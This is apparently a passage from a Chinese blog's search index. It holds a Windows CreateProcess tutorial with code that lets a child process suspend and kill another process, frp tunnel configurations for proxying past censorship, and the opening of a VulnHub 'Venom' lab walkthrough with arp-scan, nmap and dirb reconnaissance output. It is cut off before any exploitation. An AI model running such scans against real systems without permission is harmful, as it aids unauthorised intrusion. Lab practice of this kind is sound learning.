_Inout_opt_ LPWSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPSTARTUPINFOW lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateProcess  CreateProcessW</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateProcess  CreateProcessA</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// !UNICODE</span></span></span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><h3 id="lpApplicationName"><a href="#lpApplicationName" class="headerlink" title="lpApplicationName"></a>lpApplicationName</h3><p>要执行的模块的名称。<code>lpApplicationName</code>参数可以是<code>NULL</code>, 要运行批处理文件, 必须启动命令解释程序, 并将<code>lpApplicationName</code>设置成<code>cmd.exe</code>;</p><h3 id="lpCommandLine"><a href="#lpCommandLine" class="headerlink" title="lpCommandLine"></a>lpCommandLine</h3><p>要执行的命令行。<code>lpCommandLine</code>的参数可以是<code>NULL</code>, 在这种情况下, 该函数使用由<code>lpApplicationName</code>指向的字符串作为命令行。如果<code>lpApplicationName</code>和<code>lpCommandLine</code>都不为<code>NULL</code>, 则由<code>lpApplicationName</code>指向的以空字符串结尾的字符串会指定要执行的模块, 并且由<code>lpCommandLine</code>指向的以空字符串结尾的字符串会指定命令行;</p><h3 id="lpProcessAttributes"><a href="#lpProcessAttributes" class="headerlink" title="lpProcessAttributes"></a>lpProcessAttributes</h3><p>指向<code>SECURITY_ATTRIBUTES</code>结构的指针, 用于确定是否可以由子进程继承返回新进程对象的句柄。如果<code>lpProcessAttributes</code>为<code>NULL</code>, 则不能继承句柄;</p><h3 id="lpThreadAttributes"><a href="#lpThreadAttributes" class="headerlink" title="lpThreadAttributes"></a>lpThreadAttributes</h3><p>指向<code>SECURITY_ATTRIBUTES</code>结构的指针, 用于确定是否可以由子进程继承返回的新线程对象的句柄。如果<code>lpThreadAttributes</code>为<code>NULL</code>, 则不能继承句柄;</p><h3 id="bInheritHandles"><a href="#bInheritHandles" class="headerlink" title="bInheritHandles"></a>bInheritHandles</h3><p>如果此参数为<code>TRUE</code>, 则调用进程中的每个可继承句柄都将由新进程来继承。如果该参数为<code>FALSE</code>, 则不会继承句柄;</p><h3 id="dwCreationFlags"><a href="#dwCreationFlags" class="headerlink" title="dwCreationFlags"></a>dwCreationFlags</h3><p>控制优先级和创建进程的标志。例如, <code>CREATE_NEW_CONSOLE</code>表示新进程将使用一个新控制台, 而不是继承父进程的控制台。<code>CREATE_SUSPENDED</code>表示新进程的主线程会以暂停的状态来创建, 直到调用<code>ResumeThread</code>函数时才运行;</p><h3 id="lpEnvironment"><a href="#lpEnvironment" class="headerlink" title="lpEnvironment"></a>lpEnvironment</h3><p>指向新进程的环境块的指针。如果此参数为<code>NULL</code>, 则新进程将使用调用进程的环境;</p><h3 id="lpCurrentDirectory"><a href="#lpCurrentDirectory" class="headerlink" title="lpCurrentDirectory"></a>lpCurrentDirectory</h3><p>指向进程当前目录的完整路径。该字符串还可以指定<code>UNC</code>路径, 如果此参数为<code>NULL</code>, 则新进程将具有与调用进程相同的当前驱动器和目录;</p><h3 id="lpStartupInfo"><a href="#lpStartupInfo" class="headerlink" title="lpStartupInfo"></a>lpStartupInfo</h3><p>指向<code>STARTUPINFO</code>或<code>STARTUPINFOEX</code>结构的指针。<code>STARTUPINFO</code>或<code>STARTUPINFOEX</code>中的句柄在不需要时必须由<code>CloseHandle</code>关闭;</p><h3 id="lpProcessInformation"><a href="#lpProcessInformation" class="headerlink" title="lpProcessInformation"></a>lpProcessInformation</h3><p>指向<code>PROCESS_INFOMATION</code>结构的指针。用于接收有关新进程的标识信息。<code>PROCESS_INFOMATION</code>中的句柄必须在不需要时由<code>CloseHandle</code>关闭;</p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><blockquote><p>如果函数成功, 则返回值非零;<br>如果函数失败, 则返回值为零;</p></blockquote><h2 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFOMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line">si.dwFlags = STARTF_USESHOWWINDOW;      <span class="comment">// 指定wShowWindow成员有效</span></span><br><span class="line">si.wShowWindow = uiCmdShow;</span><br><span class="line">BOOL bRet = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHanle</span>(pi.hProcess);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note bug"><p><strong>使用事项-1</strong></p><p><code>CreateProcess</code>着重注意5个参数: 执行模块名称的参数<code>lpApplicationName</code>、执行命令行的参数<code>lpCommandLine</code>、控制进程优先级和创建进程标志的参数<code>dwCreationFlags</code>、指向<code>STARTUPINFO</code>信息结构的参数<code>lpStartupInfo</code>、以及指向<code>PROCESS_INFOMATION</code>信息结构的参数<code>lpProcessInformation</code>;</p></div><div class="note bug"><p><strong>使用事项-2</strong></p><p><code>CreateProcess</code>函数在指定窗口显示方式时, 需要在<code>STARTUPINFO</code>结构体中将启用标志设置成<code>STARTF_USESHOWWINDOW</code>, 表示<code>wShowWindow</code>成员显示方式有效。然后将<code>wShowWindow</code>设置为<code>SW_HIDE</code>隐藏窗口, 创建方式为<code>CREATE_NEW_CONSOLE</code>创建一个新控制台;</p></div><h2 id="创建进程时共享句柄表"><a href="#创建进程时共享句柄表" class="headerlink" title="创建进程时共享句柄表"></a>创建进程时共享句柄表</h2><blockquote><p>在创建进程中创建一个进程（比如WeChat进程）, 并设定该子进程的进程内核句柄与主线程内核句柄为可继承;<br>在A进程中再创建一个进程B, 在进程B中对WeChat进程控制;</p></blockquote><h3 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进程A代码</span></span><br><span class="line"><span class="comment">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR wcBuffer[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line">    WCHAR wcHandle[<span class="number">10</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    SECURITY_ATTRIBUTES sa_p&#123;&#125;;</span><br><span class="line">    sa_p.nLength = <span class="built_in">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">    sa_p.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line">    sa_p.bInheritHandle = TRUE;</span><br><span class="line"></span><br><span class="line">    SECURITY_ATTRIBUTES <span class="type">sa_t</span>&#123;&#125;;</span><br><span class="line">    <span class="type">sa_t</span>.nLength = <span class="built_in">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">    <span class="type">sa_t</span>.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">sa_t</span>.bInheritHandle = TRUE;</span><br><span class="line"></span><br><span class="line">    STARTUPINFO si = &#123; <span class="built_in">sizeof</span>(STARTUPINFO) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* szCmdLine = <span class="string">&quot;D:\\Tencent\\WeChat\\WeChat.exe&quot;</span>;</span><br><span class="line">    WCHAR wcCmdLine[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">wsprintf</span>(wcCmdLine, <span class="string">L&quot;%S&quot;</span>, szCmdLine);</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, wcCmdLine, &amp;sa_p, &amp;<span class="type">sa_t</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WeChat CreateProcess Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">wsprintf</span>(wcHandle, <span class="string">L&quot;%x %x&quot;</span>, pi.hProcess, pi.hThread);</span><br><span class="line">    <span class="built_in">wsprintf</span>(wcBuffer, <span class="string">L&quot;D:\\Visual Studio Projects\\DiShui Projects\\05_20_Test_Demo\\ConsoleApplication1\\x64\\Debug\\ConsoleApplication2.exe %s&quot;</span>, wcHandle);</span><br><span class="line"></span><br><span class="line">    STARTUPINFO si_B = &#123; <span class="built_in">sizeof</span>(STARTUPINFO) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi_B&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, wcBuffer, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si_B, &amp;pi_B))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateProcess Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进程B代码</span></span><br><span class="line"><span class="comment">// ConsoleApplication2.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwProcessHandle = <span class="number">-1</span>;</span><br><span class="line">    DWORD dwThreadHandle = <span class="number">0</span>;</span><br><span class="line">    WCHAR wcBuffer[<span class="number">256</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="comment">// 转换进程句柄</span></span><br><span class="line">    <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, argv[<span class="number">1</span>], <span class="number">-1</span>, wcBuffer, <span class="built_in">sizeof</span>(wcBuffer) / <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">    <span class="built_in">swscanf</span>(wcBuffer, <span class="string">L&quot;%x&quot;</span>, &amp;dwProcessHandle);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, dwProcessHandle);</span><br><span class="line">    <span class="comment">// 转换线程句柄</span></span><br><span class="line">    <span class="built_in">memset</span>(wcBuffer, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">MultiByteToWideChar</span>(CP_ACP, <span class="number">0</span>, argv[<span class="number">2</span>], <span class="number">-1</span>, wcBuffer, <span class="built_in">sizeof</span>(wcBuffer) / <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">    <span class="built_in">swscanf</span>(wcBuffer, <span class="string">L&quot;%x&quot;</span>, &amp;dwThreadHandle);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, dwThreadHandle);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;获取父进程句柄、主线程句柄\n&quot;</span>);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    <span class="comment">//挂起主线程</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;挂起主线程\n&quot;</span>);</span><br><span class="line">    <span class="built_in">SuspendThread</span>((HANDLE)dwThreadHandle);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复主线程</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;恢复主线程\n&quot;</span>);</span><br><span class="line">    <span class="built_in">ResumeThread</span>((HANDLE)dwThreadHandle);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭ID进程</span></span><br><span class="line">    <span class="built_in">TerminateProcess</span>((HANDLE)dwProcessHandle, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>((HANDLE)dwProcessHandle, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ID进程已经关闭\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shadowsocket配置</title>
      <link href="/fc41ab04.html"/>
      <url>/fc41ab04.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p class='p center large'>记录一下shadowsocket的配置</p><p class='p center small'>为了愉快的使用Google</p></div><span id="more"></span><h3 id="国内-209-配置"><a href="#国内-209-配置" class="headerlink" title="国内[209]配置"></a>国内[209]配置</h3><details cyan><summary> 国内[209]配置 </summary>              <div class='content'>              <div class="note "><p><strong>server配置</strong></p><p>[common]<br>bind_port &#x3D; 7001</p></div><div class="note "><p><strong>client配置</strong></p><p>[common]<br>server_addr &#x3D; 127.0.0.1<br>server_port &#x3D; 7000</p><p>[ssh]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 22<br>remote_port &#x3D; 6000</p></div>              </div>            </details><hr><h3 id="硅谷-184-配置"><a href="#硅谷-184-配置" class="headerlink" title="硅谷[184]配置"></a>硅谷[184]配置</h3><details cyan><summary> 硅谷[184]配置 </summary>              <div class='content'>              <div class="note "><p><strong>新加坡[188]server配置</strong></p><p>[common]<br>bind_port &#x3D; 7001</p></div><div class="note "><p><strong>新加披[188]client配置</strong></p><p>[common]<br>server_addr &#x3D; 国内[209]<br>server_port &#x3D; 7001</p><p>[frp_shadow]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 8890<br>remote_port &#x3D; 8889</p><p>[frp_shh]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 6002<br>remote_port &#x3D; 6667</p></div>              </div>            </details><hr><h3 id="新加坡-188-配置"><a href="#新加坡-188-配置" class="headerlink" title="新加坡[188]配置"></a>新加坡[188]配置</h3><details cyan><summary> 新加坡[188]配置 </summary>              <div class='content'>              <div class="note "><p><strong>server配置</strong></p><p>bind_port &#x3D; 7000</p></div><div class="note "><p><strong>新加坡[188]client配置</strong></p><p>[common]<br>server_addr &#x3D; [硅谷]184<br>server_port &#x3D; 7001</p><p>[frp_client_188]<br>type &#x3D; tcp<br>local_ip &#x3D; 1270.0.1<br>local_port &#x3D; 22<br>remote_port &#x3D; 6002</p><p>[shadowrocket_client_188]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 8388<br>remote_port &#x3D; 8890</p></div>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-Venom</title>
      <link href="/64974.html"/>
      <url>/64974.html</url>
      
        <content type="html"><![CDATA[<h2 id="记录打靶机（Venom）过程"><a href="#记录打靶机（Venom）过程" class="headerlink" title="记录打靶机（Venom）过程"></a>记录打靶机（Venom）过程</h2><p>参考：<br>    <a href="https://nepcodex.com/2021/06/venom-walkthrough-vulnhub-writeup/">https://nepcodex.com/2021/06/venom-walkthrough-vulnhub-writeup/</a><br>    <a href="https://grumpygeekwrites.wordpress.com/2021/06/20/vulnhub-venom-walk-through-tutorial-writeup/">https://grumpygeekwrites.wordpress.com/2021/06/20/vulnhub-venom-walk-through-tutorial-writeup/</a></p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用<code>arp-scan</code>进行存活IP探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan 192.168.109.0/24</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:d6:59:a7, IPv4: 192.168.109.140</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.109.2   00:50:56:f0:a1:15       VMware, Inc.</span><br><span class="line">192.168.109.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.109.147 00:0c:29:90:08:c7       VMware, Inc.</span><br><span class="line">192.168.109.254 00:50:56:f8:89:68       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned <span class="keyword">in</span> 1.930 seconds (132.64 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>经探测可知目标IP为<code>192.168.109.147</code>，接下来对此IP进行端口扫描，尝试获取更多信息</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p- 192.168.109.147   </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 09:08 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.109.147</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 3.0.3</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">443/tcp open  ssl/https   Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: VENOM; OS: Unix</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h09m59s, deviation: 3h10m31s, median: 7h59m58s</span><br><span class="line">|_nbstat: NetBIOS name: VENOM, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: venom</span><br><span class="line">|   NetBIOS computer name: VENOM\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: venom</span><br><span class="line">|_  System time: 2021-07-29T02:38:46+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2021-07-28T21:08:46</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 24.02 seconds</span><br></pre></td></tr></table></figure><p>经扫描可知目标开放了21（ftp）、80（http）、139（smb）、443（https）、445（smb）等多个端口。</p><p>整理一下思路针对不同端口：</p><ul><li>ftp（21）端口：<ul><li>尝试匿名用户登录 打岔 ✘<br>    * 漏洞数据库搜索相关版本漏洞，此处版本过高暂没有利用漏洞 打岔 ✘</li></ul></li><li>http（80）端口：<ul><li>读取源码，尝试获取敏感信息 ✔（此处在做的过程中没有仔细查看，漏掉重要突破口）</li></ul></li><li>smb（139、445）端口：<ul><li>可以尝试使用MSF中<code>ms 07-010</code>进行漏洞探测 ✗<br>    * 枚举SMB服务 ✔</li></ul></li><li>https（443）端口<ul><li>此端口暂没有什么思路</li></ul></li></ul><p><em><strong>以上思路经过验证并参考大神思路后得知突破口在http（80）端口</strong></em></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.109.147:80/ </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sat Jul 31 11:10:45 2021</span><br><span class="line">URL_BASE: http://192.168.109.147:80/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.109.147:80/ ----</span><br><span class="line">+ http://192.168.109.147:80/index.html (CODE:200|SIZE:11004)                                                                                                                      </span><br><span class="line">+ http://192.168.109.147:80/server-status (CODE:403|SIZE:280)                                                                                                                     </span><br><span class="line">                                                                                                                                                                                  </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jul 31 11:10:48 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br></pre></td></tr></table></figure><p>经扫描<code>index.html</code>返回200，此页面是<code>Ubuntu LogoApache2 Ubuntu Default Page</code>，所以当时没想到查看源码，淦。在源码结尾藏有一段MD5加密的字符串：</p><p><img src="/images/pasted-19.png" class="lazyload" data-srcset="/images/pasted-19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h2 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h2><p><img src="/images/pasted-20.png" class="lazyload" data-srcset="/images/pasted-20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>经解密后得到<code>hostinger</code>,参考网上思路后得知需要枚举SMB服务，小笔记记下，因为对445端口做信息收集还是第一次</p><h2 id="枚举SMB服务"><a href="#枚举SMB服务" class="headerlink" title="枚举SMB服务"></a>枚举SMB服务</h2><p>参考网上使用<code>enum4linux</code>进行枚举</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 